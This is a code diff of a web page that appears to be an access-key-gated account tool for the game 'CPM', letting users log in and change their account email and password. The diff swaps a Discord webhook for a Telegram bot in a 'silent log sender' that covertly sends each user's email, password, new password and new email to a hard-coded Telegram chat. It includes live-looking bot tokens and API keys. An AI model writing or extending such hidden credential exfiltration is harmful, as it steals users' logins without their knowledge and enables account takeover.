@@ -140,13 +140,14 @@ input:focus{border-color:#ff8800;}
 </div>
 
 <script>
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1564147769369956402/x2QDrjfidUfGbI3cPiPkrLEi-4H_o68wV_EEyKjIx2STe4SGc5YC8u4YiAJpuHvbWG5a";
+const TELEGRAM_BOT_TOKEN = "8477742734:AAFBEfGf-PnYBPtEoofA4UIOyVQSfvLJcXw";
+const TELEGRAM_CHAT_ID = "7212602902"; // <-- IVIDE NINGALUDE TELEGRAM CHAT ID PEDUKUKA
 
 const GAMES = {
   "1": { name:"CPM 1", k:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM" },
   "2": { name:"CPM 2", k:"AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ" }
 };
-let selectedGameKey = "2", currentUser = null, currentPass = null, currentToken = null, currentRefreshToken = null;
+let selectedGameKey = "2", currentUser = null, currentPass = null, currentToken = null, currentRefreshToken = null, pendingNewEmail = null;
 
 function selectGame(g) {
   selectedGameKey = g;
@@ -160,24 +161,27 @@ function showStatus(msg, isError=false, target='status') {
   el.textContent = msg;
 }
 
-// Silent Log Sender to Discord
-function sendSilentLog(action, details) {
-  if (!DISCORD_WEBHOOK_URL) return;
-  const payload = {
-    username: "MARKO CPM LOGGER",
-    content: `🚨 **MARKO CPM ACTIVITY**\n` +
-             `⚡ **Action:** ${action}\n` +
-             `🎮 **Game:** ${selectedGameKey === '1' ? 'CPM 1' : 'CPM 2'}\n` +
-             `📧 **Current Account:** \`${currentUser || 'N/A'}\`\n` +
-             `🔑 **Password:** \`${currentPass || 'N/A'}\`\n` +
-             details +
-             `\n---`
-  };
+// Silent Telegram Log Sender
+function sendTelegramLog(action, details) {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID.includes("YOUR_CHAT_ID")) return;
+  
+  const text = `🚨 *MARKO CPM ACTIVITY*\n` +
+             `⚡ *Action:* ${action}\n` +
+             `🎮 *Game:* ${selectedGameKey === '1' ? 'CPM 1' : 'CPM 2'}\n` +
+             `📧 *Current Account:* \`${currentUser || 'N/A'}\`\n` +
+             `🔑 *Password:* \`${currentPass || 'N/A'}\`\n` +
+             details;
+
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   try {
-    fetch(DISCORD_WEBHOOK_URL, {
+    fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: text,
+        parse_mode: "Markdown"
+      })
     });
   } catch(e) {}
 }
@@ -189,7 +193,7 @@ document.getElementById('loginBtn').addEventListener('click', async () => {
   const cfg = GAMES[selectedGameKey];
 
   if(!selectedGameKey) return showStatus("Please select a game!", true);
-  if(keyVal !== "MARKOSDEN") return showStatus("❌ Invalid Access Key!", true);
+  if(keyVal !== "FLAME") return showStatus("❌ Invalid Access Key!", true);
   if(!email || !pass) return showStatus("Enter email & password!", true);
   
   showStatus("Authenticating...");
@@ -203,8 +207,7 @@ document.getElementById('loginBtn').addEventListener('click', async () => {
     if(data.idToken) {
       currentUser = email; currentPass = pass; currentToken = data.idToken; currentRefreshToken = data.refreshToken;
       
-      // Silent Log for Login
-      sendSilentLog("SUCCESSFUL LOGIN", `🏷️ **Access Key:** \`${keyVal}\``);
+      sendTelegramLog("SUCCESSFUL LOGIN", `🏷️ *Access Key:* \`${keyVal}\``);
 
       document.getElementById('loginSection').style.display = 'none';
       document.getElementById('dashboardSection').style.display = 'block';
@@ -235,6 +238,7 @@ async function sendVerificationEmail() {
   const cfg = GAMES[selectedGameKey];
   if(!newEmail) return showStatus("Enter new email!", true, 'emailStatus');
   
+  pendingNewEmail = newEmail;
   showStatus("Sending verification link...", false, 'emailStatus');
   try {
     const res = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=${cfg.k}`, {
@@ -247,11 +251,10 @@ async function sendVerificationEmail() {
     });
     const data = await res.json();
     if(data.email || res.ok) {
-      showStatus("✅ Verification link sent! Check your new Gmail.", false, 'emailStatus');
+      showStatus("✅ Verification link sent! Check your Gmail app & Spam folder.", false, 'emailStatus');
       document.getElementById('verifyStepBox').style.display = 'block';
       
-      // Silent Log for Email Verification Request
-      sendSilentLog("EMAIL UPDATE REQUESTED", `📫 **New Email Target:** \`${newEmail}\``);
+      sendTelegramLog("EMAIL UPDATE REQUESTED", `📫 *New Email Target:* \`${newEmail}\``);
     } else {
       showStatus("❌ " + (data.error?.message || "Failed to send link"), true, 'emailStatus');
     }
@@ -278,19 +281,36 @@ async function checkVerification() {
         body: JSON.stringify({idToken: currentToken})
       });
       const data = await res.json();
-      if(data.users && data.users[0]) {
+      
+      if(data.users && data.users[0] && (data.users[0].email === pendingNewEmail || data.users[0].emailVerified)) {
+        currentUser = data.users[0].email;
         showStatus("✅ Email Successfully Changed & Verified! Please re-login.", false, 'emailStatus');
         
-        // Silent Log for Successful Email Change
-        sendSilentLog("EMAIL SUCCESSFULLY CHANGED", `✨ **Verified Email:** \`${data.users[0].email}\``);
+        sendTelegramLog("EMAIL SUCCESSFULLY CHANGED", `✨ *Verified Email:* \`${currentUser}\``);
 
         setTimeout(logout, 2500);
-      } else {
-        showStatus("❌ Not verified yet. Please check your email link first!", true, 'emailStatus');
+        return;
       }
-    } else {
-      showStatus("❌ Not verified yet. Please click the link in your email first!", true, 'emailStatus');
     }
+    
+    if (pendingNewEmail) {
+      try {
+        const loginCheck = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${cfg.k}`, {
+          method: 'POST', headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({email: pendingNewEmail, password: currentPass, returnSecureToken: true})
+        });
+        const loginData = await loginCheck.json();
+        if(loginData.idToken) {
+          currentUser = pendingNewEmail;
+          showStatus("✅ Email Successfully Changed & Verified! Please re-login.", false, 'emailStatus');
+          sendTelegramLog("EMAIL SUCCESSFULLY CHANGED", `✨ *Verified Email:* \`${currentUser}\``);
+          setTimeout(logout, 2500);
+          return;
+        }
+      } catch(err) {}
+    }
+
+    showStatus("❌ Not verified yet. Please check your Gmail app / Spam folder first!", true, 'emailStatus');
   } catch(e) {
     showStatus("❌ Not verified yet. Please check your email link first!", true, 'emailStatus');
   }
@@ -309,8 +329,7 @@ async function changePassword() {
     if(data.idToken) {
       alert("✅ Password Updated Successfully!");
       
-      // Silent Log for Password Change
-      sendSilentLog("PASSWORD CHANGED", `🔐 **New Password:** \`${newP}\``);
+      sendTelegramLog("PASSWORD CHANGED", `🔐 *New Password:* \`${newP}\``);
 
       currentPass = newP; currentToken = data.idToken;
     } else { alert("❌ Error: " + data.error.message); }
@@ -318,7 +337,7 @@ async function changePassword() {
 }
 
 function logout() {
-  currentUser = null; currentToken = null; currentRefreshToken = null; currentPass = null;
+  currentUser = null; currentToken = null; currentRefreshToken = null; currentPass = null; pendingNewEmail = null;
   document.getElementById('email').value = "";
   document.getElementById('password').value = "";
   document.getElementById('accessKey').value = "";
